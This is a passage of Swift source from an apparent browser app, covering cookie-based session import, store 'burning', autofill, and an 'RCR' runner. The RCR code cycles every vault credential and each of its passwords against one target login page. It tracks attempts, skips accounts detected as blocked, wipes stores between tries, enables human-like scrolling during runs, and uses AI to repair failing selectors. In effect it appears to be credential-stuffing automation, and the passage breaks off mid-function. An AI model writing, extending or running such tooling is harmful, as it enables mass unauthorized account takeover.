        // login the deck exists to preserve.
        guard !isReplayMode else {
            showToast("Leave the deck to load a session", force: true)
            return
        }
        isImportingSession = true
    }

    /// Reads a picked session file and applies it to the open window(s).
    func handleSessionImport(_ result: Result<[URL], Error>) {
        guard case .success(let urls) = result, let url = urls.first else { return }
        guard url.startAccessingSecurityScopedResource() else {
            showToast("Couldn't open that file", force: true)
            return
        }
        defer { url.stopAccessingSecurityScopedResource() }
        guard let data = try? Data(contentsOf: url),
              let snapshot = SessionTransferService.decode(data) else {
            showToast("Not a valid session file", force: true)
            return
        }
        Task { await applySession(snapshot) }
    }

    /// Applies a decoded snapshot to the active tab (single) or every live
    /// window (grid): sets cookies, then reloads onto the saved page so the
    /// restored session takes effect immediately.
    private func applySession(_ snapshot: SessionSnapshot) async {
        let targetURL = URL(string: snapshot.href)
        if isQuadMode {
            let windows = quadController.enabledSessions
            for session in windows {
                await SessionTransferService.shared.applyCookies(snapshot, toStoreID: session.storeID)
                if let targetURL {
                    session.url = targetURL
                    session.webView?.load(URLRequest(url: targetURL))
                } else {
                    session.webView?.reload()
                }
            }
            showToast("Session loaded into \(windows.count) window\(windows.count == 1 ? "" : "s")")
        } else if let tab = activeTab {
            await SessionTransferService.shared.applyCookies(snapshot, toStoreID: tab.dataStoreID)
            if let targetURL {
                tab.url = targetURL
                tab.lastURL = targetURL
                tab.webView?.load(URLRequest(url: targetURL))
            } else {
                tab.webView?.reload()
            }
            showToast("Session loaded")
        }
    }

    nonisolated private static func sessionTimestamp() -> String {
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyyMMdd-HHmm"
        formatter.locale = Locale(identifier: "en_US_POSIX")
        return formatter.string(from: Date())
    }

    func updateURLBar() {
        guard !isURLBarEditing else { return }
        if isReplayMode {
            let newValue = replayTab?.webView?.url?.absoluteString
                ?? replayTab?.url?.absoluteString
                ?? ""
            guard urlBarText != newValue else { return }
            urlBarText = newValue
        } else if isDualQuadMode {
            let siteA = quadController.representativeSession(forTargetSite: 0)
            let siteB = quadController.representativeSession(forTargetSite: 1)
            let newA = siteA?.webView?.url?.absoluteString ?? siteA?.url?.absoluteString ?? ""
            let newB = siteB?.webView?.url?.absoluteString ?? siteB?.url?.absoluteString ?? ""
            if urlBarText != newA { urlBarText = newA }
            if urlBarTextB != newB { urlBarTextB = newB }
        } else if isQuadMode {
            let newValue = quadController.focusedSession.webView?.url?.absoluteString
                ?? quadController.focusedSession.url?.absoluteString
                ?? ""
            guard urlBarText != newValue else { return }
            urlBarText = newValue
        } else {
            let newValue = activeTab?.webView?.url?.absoluteString ?? activeTab?.displayURL ?? ""
            guard urlBarText != newValue else { return }
            urlBarText = newValue
        }
    }

    // MARK: - Address bar auto-hide

    func resetURLBarTimer() {
        urlBarHideTimerTask?.cancel()
        isURLBarVisible = true
        // Never start a hide countdown while the user is actively editing
        // the address bar — the bar must stay pinned open until editing ends.
        guard !isURLBarEditing else { return }
        guard !isRCRRunning, !quadController.anyRCRRunning else { return }
        urlBarHideTimerTask = Task { [weak self] in
            try? await Task.sleep(for: .seconds(5))
            guard let self, !Task.isCancelled else { return }
            // Re-check editing state at fire time — the user may have
            // focused the field after the countdown was scheduled.
            guard !self.isURLBarEditing else { return }
            guard !self.isRCRRunning, !self.quadController.anyRCRRunning else { return }
            withAnimation(.easeInOut(duration: 0.3)) {
                self.isURLBarVisible = false
            }
        }
    }

    func resetURLBarBTimer() {
        urlBarBHideTimerTask?.cancel()
        isURLBarBVisible = true
        // Same editing guard for the Site B address bar.
        guard !isURLBarEditing else { return }
        guard !quadController.anyRCRRunning else { return }
        urlBarBHideTimerTask = Task { [weak self] in
            try? await Task.sleep(for: .seconds(5))
            guard let self, !Task.isCancelled else { return }
            guard !self.isURLBarEditing else { return }
            guard !self.quadController.anyRCRRunning else { return }
            withAnimation(.easeInOut(duration: 0.3)) {
                self.isURLBarBVisible = false
            }
        }
    }

    // MARK: - Cookie purge timer

    private func startCookiePurgeTimer() {
        cookiePurgeTask?.cancel()
        cookiePurgeTask = Task { [weak self] in
            while !Task.isCancelled {
                try? await Task.sleep(for: .seconds(3600))
                guard !Task.isCancelled, let self else { return }
                await self.purgeTrackingCookies()
            }
        }
    }

    /// Hourly privacy sweep. HttpOnly cookies — which includes Google's
    /// tracking cookies — are invisible to page JavaScript by design, so
    /// this deletes them through the system cookie-store API instead.
    private func purgeTrackingCookies() async {
        // Sweep EVERY open tab and every multi-window store — previously only
        // the active tab + quad sessions were purged, so trackers survived
        // indefinitely in background tabs.
        var storeIDs: Set<UUID> = []
        for tab in tabs { storeIDs.insert(tab.dataStoreID) }
        for session in quadController.sessions { storeIDs.insert(session.storeID) }
        for id in storeIDs {
            let cookieStore = WKWebsiteDataStore(forIdentifier: id).httpCookieStore
            let cookies = await cookieStore.allCookies()
            for cookie in cookies where Self.trackingCookieNames.contains(cookie.name) {
                await cookieStore.deleteCookie(cookie)
            }
        }
    }

    /// Cookie names targeted by the hourly sweep — the same list the old
    /// JavaScript sweep used, now deleted through the native cookie store.
    private static let trackingCookieNames: Set<String> = [
        "__Secure-3PSID", "__Secure-3PAPISID", "__Secure-3PSIDCC",
        "_ga", "_gid", "_gat", "NID", "SID", "HSID", "APISID",
        "SAPISID", "SSID", "SIDCC", "__Secure-1PSID", "__Secure-1PAPISID",
    ]

    // MARK: - Site-setting cache
    func fetchSiteSetting(for domain: String) -> SiteSetting? {
        let lowDomain = domain.lowercased()
        if let cached = siteSettingCache[lowDomain] {
            return cached
        }
        guard let context = modelContext else { return nil }
        let descriptor = FetchDescriptor<SiteSetting>(
            predicate: #Predicate<SiteSetting> { $0.domain == lowDomain }
        )
        let result = try? context.fetch(descriptor).first
        siteSettingCache[lowDomain] = result
        return result
    }

    func invalidateSiteSettingCache(for domain: String) {
        siteSettingCache.removeValue(forKey: domain.lowercased())
    }

    func isDomainExcluded(_ domain: String) -> Bool {
        let canonical = ExcludedDomain.canonicalize(domain)
        guard !canonical.isEmpty else { return false }
        if !excludedDomainCacheLoaded { reloadExcludedDomains() }
        return excludedDomainCache.contains(canonical)
    }

    func reloadExcludedDomains() {
        guard let context = modelContext else {
            excludedDomainCache = []
            excludedDomainCacheLoaded = true
            return
        }
        let descriptor = FetchDescriptor<ExcludedDomain>()
        if let results = try? context.fetch(descriptor) {
            excludedDomainCache = Set(results.map { $0.domain })
        } else {
            excludedDomainCache = []
        }
        excludedDomainCacheLoaded = true
    }

    // MARK: - Auto Login & Sure Login (used by SiteSettings only)

    func performAutoLogin(siteSetting: SiteSetting?) {
        guard let siteSetting, siteSetting.isAutoLoginEnabled else { return }

        let script = JavaScriptInjectionService.submitFormScript(
            submitSelector: siteSetting.submitButtonSelector
        )

        activeTab?.webView?.evaluateJavaScript(script) { [weak self] _, _ in
            Task { @MainActor in
                guard let self else { return }
                self.installLoginResponseObserverIfEnabled(domain: siteSetting.domain)
                if siteSetting.isSureLoginEnabled {
                    self.startSureLogin(siteSetting: siteSetting)
                }
            }
        }
    }

    static func detectResponseKey(for domain: String) -> String {
        "detectLoginResponse_\(domain.lowercased())"
    }

    func isLoginResponseDetectionEnabled(for domain: String) -> Bool {
        UserDefaults.standard.bool(forKey: Self.detectResponseKey(for: domain))
    }

    func installLoginResponseObserverIfEnabled(domain: String) {
        guard !isRCRRunning else { return }
        guard isLoginResponseDetectionEnabled(for: domain) else { return }
        activeTab?.webView?.evaluateJavaScript(
            JavaScriptInjectionService.loginResponseObserverScript(),
            completionHandler: nil
        )
    }

    func handleLoginResponseMessage(_ payload: [String: Any]) {
        let kind = (payload["kind"] as? String) ?? ""
        switch kind {
        case "success": showToast("Login succeeded")
        case "failed": showToast("Login failed")
        case "blocked": showToast("Account blocked")
        case "timeout": showToast("No login response detected")
        default: break
        }
    }

    private func startSureLogin(siteSetting: SiteSetting) {
        sureLoginTask?.cancel()
        sureLoginTask = Task { [weak self] in
            guard let self else { return }
            let retries = siteSetting.sureLoginRetryCount
            let delay = siteSetting.sureLoginDelaySeconds
            let submitSelector = siteSetting.submitButtonSelector

            for _ in 0..<retries {
                try? await Task.sleep(for: .seconds(delay))
                guard !Task.isCancelled else { break }

                let script = JavaScriptInjectionService.submitFormScript(submitSelector: submitSelector)
                _ = try? await self.activeTab?.webView?.evaluateJavaScript(script)
            }
        }
    }

    // MARK: - Burn

    func burnCurrentTab() {
        // Burning mid-run rips the data store out from under the runner —
        // the observer dies with it and the attempt would stall. RCR does
        // its own coordinated burns.
        guard !isRCRRunning, !quadController.anyRCRRunning else {
            showToast("Stop RCR before burning", force: true)
            return
        }
        // The flame wipes a store. In the deck that store is a saved login,
        // so burning here would silently destroy the circle you're viewing.
        guard !isReplayMode else {
            showToast("Leave the deck to burn a session", force: true)
            return
        }
        if isQuadMode {
            burnQuadFocused()
            return
        }
        guard let tab = activeTab else { return }
        let lastURL = tab.lastURL ?? tab.url
        let storeID = tab.dataStoreID
        let domain = tab.domain

        Task { @MainActor in
            // Wipe only this tab's isolated store — other tabs stay intact.
            WindowDiagnosticsService.shared.noteBurn(tab: tab)
            await QuadDataStore.burn(dataStoreID: storeID)
            if let context = self.modelContext, !domain.isEmpty {
                try? context.delete(
                    model: BrowsingHistoryEntry.self,
                    where: #Predicate<BrowsingHistoryEntry> { $0.domain == domain }
                )
                try? context.save()
            }
            if let url = lastURL {
                tab.webView?.load(URLRequest(url: url))
            } else {
                tab.webView?.reload()
            }
            self.rcrBurnFlash &+= 1
            self.showToast("Session burned & reloaded")
        }
    }

    /// Quad-mode flame: wipes only the focused cell's isolated data store
    /// and reloads the URL it was on.
    func burnQuadFocused() {
        let session = quadController.focusedSession
        let url = session.webView?.url ?? session.url ?? Self.defaultHomeURL
        Task { @MainActor in
            WindowDiagnosticsService.shared.noteBurn(session: session)
            if !ParkedSessionStore.shared.contains(storeID: session.storeID) {
                await QuadDataStore.burn(dataStoreID: session.storeID)
            }
            session.webView?.load(URLRequest(url: url))
            self.rcrBurnFlash &+= 1
            self.showToast("Cell \(session.id) burned & reloaded")
        }
    }

    // MARK: - Debounced History

    func addHistoryEntry(url: String, title: String, tabID: String) {
        // Dedupe per tab — two tabs loading the same URL in quick succession
        // must each record their own entry.
        guard lastHistoryURLByTab[tabID] != url else { return }
        lastHistoryURLByTab[tabID] = url

        historyDebounceTasks[tabID]?.cancel()
        historyDebounceTasks[tabID] = Task { [weak self] in
            try? await Task.sleep(for: .seconds(0.5))
            guard !Task.isCancelled, let self, let context = self.modelContext else { return }
            let domain = CredentialImportService.extractDomain(from: url)
            let entry = BrowsingHistoryEntry(url: url, title: title, domain: domain)
            context.insert(entry)
            self.trimOldHistoryIfNeeded(context: context)
        }
    }

    /// Keeps history from growing forever — anything older than 7 days is
    /// pruned automatically on every new visit. Cheap enough to run inline;
    /// this already runs debounced, at most once per tab per navigation.
    private func trimOldHistoryIfNeeded(context: ModelContext) {
        let cutoff = Date().addingTimeInterval(-7 * 24 * 3600)
        try? context.delete(
            model: BrowsingHistoryEntry.self,
            where: #Predicate<BrowsingHistoryEntry> { $0.visitedAt < cutoff }
        )
        try? context.save()
    }

    func addBookmark() {
        guard let context = modelContext else {
            showToast("Nothing to bookmark", force: true)
            return
        }

        let urlString: String?
        let title: String
        let domain: String
        if isReplayMode, let tab = replayTab {
            urlString = tab.webView?.url?.absoluteString ?? tab.url?.absoluteString
            title = tab.title
            domain = tab.domain
        } else if isQuadMode {
            let session = quadController.focusedSession
            urlString = session.webView?.url?.absoluteString ?? session.url?.absoluteString
            title = session.title.isEmpty ? (session.domain.isEmpty ? "Bookmark" : session.domain) : session.title
            domain = session.domain
        } else {
            guard let tab = activeTab else {
                showToast("Nothing to bookmark", force: true)
                return
            }
            urlString = tab.webView?.url?.absoluteString ?? tab.url?.absoluteString
            title = tab.title
            domain = tab.domain
        }

        guard let url = urlString, !url.isEmpty else {
            showToast("Nothing to bookmark", force: true)
            return
        }
        let bookmark = Bookmark(url: url, title: title, domain: domain)
        context.insert(bookmark)
        showToast("Bookmark added")
    }

    // MARK: - Page-load autofill

    /// Fills a matching vault credential into the active single-window tab
    /// when Settings → Auto-fill on Page Load is enabled. Skips excluded
    /// domains, RCR runs, and pages without a visible login form.
    func handlePageLoadAutofill(for tab: BrowserTab) {
        guard !isRCRRunning, !quadController.anyRCRRunning else { return }
        guard tab.id == activeTab?.id else { return }
        let autoFillEnabled = UserDefaults.standard.object(forKey: SettingsKey.autoFillOnPageLoad) as? Bool ?? true
        guard autoFillEnabled else { return }

        let domain = tab.domain
        guard !domain.isEmpty, !isDomainExcluded(domain) else { return }
        guard let webView = tab.webView else { return }

        Task { @MainActor [weak self] in
            guard let self else { return }
            // Brief settle so SPA login forms finish mounting.
            try? await Task.sleep(for: .milliseconds(350))
            guard !self.isRCRRunning, self.activeTab?.id == tab.id else { return }

            let detectRaw = try? await webView.evaluateJavaScript(
                JavaScriptInjectionService.detectLoginFormScript()
            )
            let hasLoginForm: Bool = {
                if let json = detectRaw as? String,
                   let data = json.data(using: .utf8),
                   let dict = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                   let flag = dict["hasLoginForm"] as? Bool {
                    return flag
                }
                return false
            }()
            guard hasLoginForm else { return }

            guard let context = self.modelContext else { return }
            let domainLower = domain.lowercased()
            let domainVariants = Self.autofillDomainCandidates(for: domainLower)
            let descriptor = FetchDescriptor<Credential>(
                sortBy: [
                    SortDescriptor(\.lastUsedAt, order: .reverse),
                    SortDescriptor(\.usageCount, order: .reverse),
                    SortDescriptor(\.updatedAt, order: .reverse)
                ]
            )
            let all = (try? context.fetch(descriptor)) ?? []
            guard let match = all.first(where: { domainVariants.contains($0.domain.lowercased()) }) else {
                return
            }
            guard let password = KeychainService.shared.getPassword(for: match.id), !password.isEmpty else {
                return
            }

            let siteSetting = self.fetchSiteSetting(for: domainLower)
            let fillScript = JavaScriptInjectionService.fillCredentialScript(
                username: match.username,
                password: password,
                usernameSelector: siteSetting?.usernameSelector,
                passwordSelector: siteSetting?.passwordSelector,
                suppressKeyboard: true
            )
            let fillRaw = try? await webView.evaluateJavaScript(fillScript)
            let filledCount: Int = {
                if let json = fillRaw as? String,
                   let data = json.data(using: .utf8),
                   let dict = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                   let count = dict["filled"] as? Int {
                    return count
                }
                return 0
            }()
            guard filledCount > 0 else { return }

            match.lastUsedAt = Date()
            match.usageCount += 1

            if let siteSetting, siteSetting.isAutoLoginEnabled {
                self.performAutoLogin(siteSetting: siteSetting)
            } else {
                self.showToast("Filled login for \(match.username)")
            }
        }
    }

    /// Builds a small set of domain aliases so `example.com` also matches a
    /// vault entry stored as `www.example.com` (and vice versa). Shared by
    /// the single-window and multi-window autofill paths.
    static func autofillDomainCandidates(for domain: String) -> Set<String> {
        var candidates: Set<String> = [domain]
        if domain.hasPrefix("www.") {
            candidates.insert(String(domain.dropFirst(4)))
        } else {
            candidates.insert("www.\(domain)")
        }
        return candidates
    }

    // MARK: - Save-detection (offer to save after a manual submit)

    func detectAndOfferSave() {
        let offerEnabled = UserDefaults.standard.object(forKey: SettingsKey.offerToSavePasswords) as? Bool ?? true
        guard offerEnabled else { return }
        let domain = activeTab?.domain ?? ""
        guard !isDomainExcluded(domain) else { return }

        let script = JavaScriptInjectionService.extractFilledCredentialsScript()
        activeTab?.webView?.evaluateJavaScript(script) { [weak self] result, _ in
            Task { @MainActor in
                guard let self, let json = result as? String,
                      let data = json.data(using: .utf8),
                      let dict = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                      let found = dict["found"] as? Bool, found,
                      let username = dict["username"] as? String, !username.isEmpty,
                      let password = dict["password"] as? String, !password.isEmpty else { return }

                guard let context = self.modelContext else { return }
                // Match domain + username to avoid false "already exists"
                // when the same username appears across multiple sites.
                let domainLower = domain.lowercased()
                let descriptor = FetchDescriptor<Credential>(
                    predicate: #Predicate<Credential> {
                        $0.username == username && $0.domain == domainLower
                    }
                )
                let alreadyExists = (try? context.fetch(descriptor).first) != nil
                if !alreadyExists {
                    self.detectedUsername = username
                    self.detectedPassword = password
                    self.detectedDomain = domainLower
                    self.isShowingSaveCredentialAlert = true
                }
            }
        }
    }

    func saveDetectedCredential() {
        let domain = detectedDomain.isEmpty ? (activeTab?.domain ?? "") : detectedDomain
        guard let context = modelContext, !domain.isEmpty else { return }
        guard !isDomainExcluded(domain) else {
            showToast("Domain is on the exclude list", force: true)
            detectedUsername = ""
            detectedPassword = ""
            detectedDomain = ""
            return
        }
        let credential = Credential(domain: domain, username: detectedUsername)
        context.insert(credential)
        _ = KeychainService.shared.savePassword(detectedPassword, for: credential.id)
        showToast("Credential saved for \(domain)")
        detectedUsername = ""
        detectedPassword = ""
        detectedDomain = ""
    }

    // MARK: - RCR

    func toggleRCR() {
        guard !isBlockedByReplayMode else { return }
        if isQuadMode {
            if quadController.anyRCRRunning || quadController.isStartingRCR {
                quadController.stopQuadRCR(reason: "Quad RCR stopped")
            } else {
                if isDualQuadMode {
                    quadController.startDualQuadRCR(urlA: dualQuadURL_A, urlB: dualQuadURL_B)
                } else {
                    guard let target = quadController.focusedSession.webView?.url
                        ?? quadController.focusedSession.url else {
                        showToast("Open a login page in any cell first", force: true)
                        return
                    }
                    quadController.startQuadRCR(targetURL: target)
                }
            }
            return
        }
        if isRCRRunning || isStartingRCR {
            stopRCR(reason: "RCR stopped")
        } else {
            startRCR()
        }
    }

    /// True when a run may not start: the deck covers the window the runner
    /// would drive, so it has to be closed first.
    private var isBlockedByReplayMode: Bool {
        guard isReplayMode else { return false }
        showToast("Leave the deck to start a run", force: true)
        return true
    }

    /// Snapshot of upcoming + current + completed credentials for the queue
    /// pill. Returns at most `limit + 1` upcoming items (current + next N).
    func queueSnapshot(upcomingLimit: Int = 8) -> [RCRQueueItem] {
        guard !rcrQueueIDs.isEmpty else { return [] }
        var items: [RCRQueueItem] = []
        let total = rcrQueueIDs.count
        let upper = min(rcrIndex + upcomingLimit + 1, total)
        for i in rcrIndex..<upper {
            let id = rcrQueueIDs[i]
            let username = i < rcrQueueUsernames.count ? rcrQueueUsernames[i] : ""
            let pwCount = i < rcrQueuePasswordCounts.count ? rcrQueuePasswordCounts[i] : 0
            items.append(RCRQueueItem(
                id: id,
                username: username,
                passwordCount: pwCount
            ))
        }
        return items
    }

    /// Done items, in original queue order.
    func completedSnapshot() -> [RCRQueueItem] {
        guard !rcrQueueIDs.isEmpty else { return [] }
        var items: [RCRQueueItem] = []
        for (i, id) in rcrQueueIDs.enumerated() where rcrCompletedIDs.contains(id) {
            let username = i < rcrQueueUsernames.count ? rcrQueueUsernames[i] : ""
            let pwCount = i < rcrQueuePasswordCounts.count ? rcrQueuePasswordCounts[i] : 0
            items.append(RCRQueueItem(
                id: id,
                username: username,
                passwordCount: pwCount
            ))
        }
        return items
    }

    func startRCR() {
        // Re-entrancy latch: the keychain preflight below is async, so
        // without this a double-tap in that window starts two overlapping
        // runs fighting over the same tab.
        guard !isRCRRunning, !isStartingRCR else { return }
        guard let context = modelContext else { return }
        if !excludedDomainCacheLoaded { reloadExcludedDomains() }

        guard let target = activeTab?.webView?.url ?? activeTab?.url else {
            showToast("Open a login page first", force: true)
            return
        }
        rcrTargetURL = target
        rcrCurrentDomain = target.host(percentEncoded: false) ?? ""

        let descriptor = FetchDescriptor<Credential>(
            sortBy: [
                SortDescriptor(\Credential.domain),
                SortDescriptor(\Credential.username)
            ]
        )
        guard let all = try? context.fetch(descriptor) else { return }
        let queue = all.filter {
            !excludedDomainCache.contains(ExcludedDomain.canonicalize($0.domain))
        }
        guard !queue.isEmpty else {
            showToast("Vault is empty", force: true)
            return
        }

        isStartingRCR = true
        rcrStartGeneration &+= 1
        let startGeneration = rcrStartGeneration

        // Fetch password counts off the main thread so a large vault can't
        // freeze the UI at run start; the rest of the setup continues in
        // `beginRCRRun`.
        let credIDs = queue.map(\.id)
        let usernames = queue.map(\.username)
        Task { [weak self] in
            guard let self else { return }
            let counts = await Task.detached {
                credIDs.map { KeychainService.shared.getPasswords(for: $0).count }
            }.value
            // A stop (or a stale earlier start) during the preflight aborts
            // this run before it touches anything.
            guard self.isStartingRCR, self.rcrStartGeneration == startGeneration else { return }
            self.isStartingRCR = false
            self.beginRCRRun(
                context: context,
                credIDs: credIDs,
                usernames: usernames,
                counts: counts,
                target: target
            )
        }
    }

    /// Continues `startRCR` once password counts are ready: builds the queue
    /// snapshot, applies the restart/resume rules, and kicks off the first
    /// credential.
    private func beginRCRRun(
        context: ModelContext,
        credIDs: [String],
        usernames: [String],
        counts: [Int],
        target: URL
    ) {
        rcrQueueIDs = credIDs
        rcrQueueUsernames = usernames
        rcrQueuePasswordCounts = counts
        rcrTotal = credIDs.count
        rcrCompletedIDs = []
        needsPostBurnSettle = false

        // If the entire vault was previously finished against this same
        // target, treat this press as "start over" — wipe attempt history
        // for the domain so every credential is eligible again.
        let targetDomain = target.host(percentEncoded: false)?.lowercased() ?? ""
        let tracker = AttemptTrackingService.shared
        let allFinished = zip(credIDs, counts).allSatisfy { id, total in
            tracker.credentialIsFinished(
                context: context,
                credentialID: id,
                targetDomain: targetDomain,
                totalPasswords: total
            )
        }
        if allFinished {
            tracker.clearAttempts(context: context, targetDomain: targetDomain)
            UserDefaults.standard.removeObject(forKey: rcrLastCompletedKey)
            rcrIndex = 0
        } else {
            // Resume from saved position (last completed credential).
            let savedID = UserDefaults.standard.string(forKey: rcrLastCompletedKey)
            if let savedID, let idx = rcrQueueIDs.firstIndex(of: savedID) {
                rcrIndex = (idx + 1) % rcrTotal
            } else {
                rcrIndex = 0
            }

            // Skip credentials already finished against this target or that
            // were ever perma-disabled.
            while rcrIndex < rcrTotal {
                let id = rcrQueueIDs[rcrIndex]
                let total = rcrQueuePasswordCounts[rcrIndex]
                let finished = tracker.credentialIsFinished(
                    context: context,
                    credentialID: id,
                    targetDomain: targetDomain,
                    totalPasswords: total
                )
                if finished || PermaDisabledStore.shared.isDisabled(credentialID: id) {
                    rcrCompletedIDs.insert(id)
                    rcrIndex += 1
                } else {
                    break
                }
            }
        }

        // Human-like scrolling only runs while an automated run is active.
        activeTab?.webView?.evaluateJavaScript(
            JavaScriptInjectionService.rcrScrollEnableScript(),
            completionHandler: nil
        )
        // Fresh run → fresh healer retry budget, so a site that hit its
        // per-domain repair cap on a previous run is eligible again.
        FillHealerEngine.shared.resetRunBudget()
        ParkedSessionStore.shared.markRunStarted()
        NeedsReviewStore.shared.markRunStarted()
        isRCRRunning = true
        rcrStatus = .navigating
        Task { await runCurrentCredential() }
    }

    func stopRCR(reason: String? = nil) {
        // Invalidate any in-flight start preflight and per-attempt watchdog.
        isStartingRCR = false
        rcrStartGeneration &+= 1
        cancelRCRWatchdog()
        rcrJudging = false
        // A paused run being stopped must not leave the runner suspended
        // forever on its continuation.
        isRCRPaused = false
        rcrPauseContinuation?.resume()
        rcrPauseContinuation = nil
        isRCRRunning = false
        rcrStatus = .idle
        rcrAwaitingNavigation = false
        needsPostBurnSettle = false
        rcrTargetURL = nil
        // Don't leave plaintext passwords sitting in memory after a stop.
        rcrCurrentPasswords = []
        rcrPasswordsCredentialID = ""
        rcrAttemptGeneration &+= 1
        activeTab?.webView?.evaluateJavaScript(
            JavaScriptInjectionService.rcrUninstallObserverScript(),
            completionHandler: nil
        )
        activeTab?.webView?.evaluateJavaScript(
            JavaScriptInjectionService.rcrScrollDisableScript(),
            completionHandler: nil
        )
        if let reason { showToast(reason) }
        ParkedSessionStore.shared.markRunFinished()
        offerNeedsReviewSummaryIfNeeded()
        resetURLBarTimer()
        if isDualQuadMode {
            resetURLBarBTimer()
        }
    }

    /// Surfaces the Needs Review summary for anything flagged as disabled
    /// during the run that just ended. Never steals an already-open sheet
    /// — falls back to a toast so nothing important gets interrupted.
    func offerNeedsReviewSummaryIfNeeded() {
        guard NeedsReviewStore.shared.hasFlaggedThisRun else { return }
        if presentedSheet == nil {
            presentedSheet = .needsReview
        } else {
            let count = NeedsReviewStore.shared.flaggedThisRun.count
            showToast("\(count) account\(count == 1 ? "" : "s") need review — see Vault", force: true)
        }
    }

    private func currentRCRCredential() -> Credential? {
        guard rcrIndex < rcrQueueIDs.count, let context = modelContext else { return nil }
        let id = rcrQueueIDs[rcrIndex]
        let descriptor = FetchDescriptor<Credential>(
            predicate: #Predicate<Credential> { $0.id == id }
        )
        return try? context.fetch(descriptor).first
    }

    private func runCurrentCredential() async {
        guard isRCRRunning else { return }
        await waitIfPaused()
        // Skip any credentials in temp-disabled cooldown OR ever perma-disabled.
        while rcrIndex < rcrQueueIDs.count {
            let id = rcrQueueIDs[rcrIndex]
            if TempDisabledStore.shared.isDisabled(credentialID: id)
                || PermaDisabledStore.shared.isDisabled(credentialID: id) {
                rcrCompletedIDs.insert(id)
                rcrIndex += 1
                rcrPasswordIndex = 0
            } else {
                break
            }
        }
        guard rcrIndex < rcrQueueIDs.count else {
            rcrStatus = .success
            UserDefaults.standard.removeObject(forKey: rcrLastCompletedKey)
            showToast("RCR complete (\(rcrTotal)/\(rcrTotal))")
            stopRCR()
            return
        }

        guard let credential = currentRCRCredential() else {
            rcrIndex += 1
            await runCurrentCredential()
            return
        }

        let credID = credential.id
        let allPasswords = await Task.detached {
            KeychainService.shared.getPasswords(for: credID)
        }.value

        guard !allPasswords.isEmpty else {
            persistRCRProgress(completedID: credential.id)
            rcrCompletedIDs.insert(credential.id)
            rcrIndex += 1
            rcrPasswordIndex = 0
            await runCurrentCredential()
            return
        }

        // Filter out already-attempted passwords (resume-safe).
        let targetDomain = rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? ""
        let tracker = AttemptTrackingService.shared
        let context = modelContext
        let filtered: [String]
        if retryFailed, let context {
            // Only skip success / disabled.
            filtered = allPasswords.filter { pw in
                !tracker.isTerminallyAttempted(
                    context: context,
                    credentialID: credential.id,
                    passwordHash: PasswordFingerprint.hash(pw),
                    targetDomain: targetDomain
                )
            }
        } else if let context {
            // Skip any password with a recorded result (success/disabled/failed).
            let descriptor = FetchDescriptor<AttemptRecord>(
                predicate: #Predicate<AttemptRecord> { rec in
                    rec.credentialID == credID
                        && rec.targetDomain == targetDomain
                        && rec.statusRaw != "pending"
                        && rec.statusRaw != "skipped"
                }
            )
            let attempted = Set(((try? context.fetch(descriptor)) ?? []).map { $0.passwordHash })
            filtered = allPasswords.filter { !attempted.contains(PasswordFingerprint.hash($0)) }
        } else {
            filtered = allPasswords
        }

        guard !filtered.isEmpty else {
            persistRCRProgress(completedID: credential.id)
            rcrCompletedIDs.insert(credential.id)
            rcrIndex += 1
            rcrPasswordIndex = 0
            await runCurrentCredential()
            return
        }

        rcrCurrentPasswords = filtered
        rcrPasswordIndex = 0
        rcrPasswordsCredentialID = credential.id
        rcrCurrentUsername = credential.username
        if let target = rcrTargetURL {
            rcrCurrentDomain = target.host(percentEncoded: false) ?? credential.domain
        }

        let liveURL = activeTab?.webView?.url ?? activeTab?.url
        if !Self.sameTarget(liveURL, rcrTargetURL), let target = rcrTargetURL {
            rcrStatus = .navigating
            rcrAwaitingNavigation = true
            activeTab?.url = target
            activeTab?.lastURL = target
            activeTab?.webView?.load(URLRequest(url: target))
            // If this load never finishes (dead page, wedged process), the
            // watchdog advances the run instead of stalling forever.
            armRCRWatchdog()
            return
        }

        await attemptFill()
    }

    /// Same-origin check used to decide whether the runner needs to
    /// re-navigate before filling. Includes the query string — login flows
    /// are often differentiated by `?next=` / return-URL parameters, and
    /// ignoring them could fill credentials into the wrong page variant.
    nonisolated static func sameTarget(_ a: URL?, _ b: URL?) -> Bool {
        guard let a, let b else { return false }
        return a.scheme?.lowercased() == b.scheme?.lowercased()
            && a.host(percentEncoded: false)?.lowercased() == b.host(percentEncoded: false)?.lowercased()
            && a.path == b.path
            && (a.query(percentEncoded: false) ?? "") == (b.query(percentEncoded: false) ?? "")
    }

    /// Origin gate for `rcrObserver` page messages. The observer runs inside
    /// the page's JS context, so any page can post forged state (e.g.
    /// `hasDisabled: true`, which triggers vault auto-deletion). Only trust
    /// messages from the run's target host — exact match after www-stripping,
    /// or a subdomain of it (post-login redirects often land on
    /// `account.`/`my.` subdomains of the target).
    nonisolated static func isTrustedRCROrigin(_ originHost: String?, targetHost: String?) -> Bool {
        guard let originHost, let targetHost else { return false }
        func normalize(_ host: String) -> String {
            var h = host.lowercased()
            if h.hasPrefix("www.") { h = String(h.dropFirst(4)) }
            return h
        }
        let origin = normalize(originHost)
        let target = normalize(targetHost)
        guard !origin.isEmpty, !target.isEmpty else { return false }
        return origin == target || origin.hasSuffix("." + target)
    }

    private func attemptFill() async {
        guard isRCRRunning else { return }
        await waitIfPaused()
        guard let credential = currentRCRCredential() else {
            rcrIndex += 1
            await runCurrentCredential()
            return
        }
        // Cross-credential guard: the in-memory password list must belong
        // to THIS credential. After a park or a burn the list still holds
        // the previous credential's passwords — rebuild instead of filling
        // the wrong account's secrets.
        guard Self.passwordListBelongs(to: credential.id, listCredentialID: rcrPasswordsCredentialID),
              !rcrCurrentPasswords.isEmpty else {
            rcrCurrentPasswords = []
            await runCurrentCredential()
            return
        }
        let generation = rcrAttemptGeneration
        let password = rcrCurrentPasswords[rcrPasswordIndex]
        let targetDomain = rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain
        let siteSetting = fetchSiteSetting(for: targetDomain)

        rcrStatus = .filling
        let fillScript = JavaScriptInjectionService.fillCredentialScript(
            username: credential.username,
            password: password,
            usernameSelector: siteSetting?.usernameSelector,
            passwordSelector: siteSetting?.passwordSelector,
            suppressKeyboard: true
        )
        let fillResult = try? await activeTab?.webView?.evaluateJavaScript(fillScript)

        // Self-healing (Part 3): if the generic selectors missed a field,
        // ask the AI to repair them — verified and bounded, never on
        // captcha/lockout pages.
        var healedSubmitSelector: String? = nil
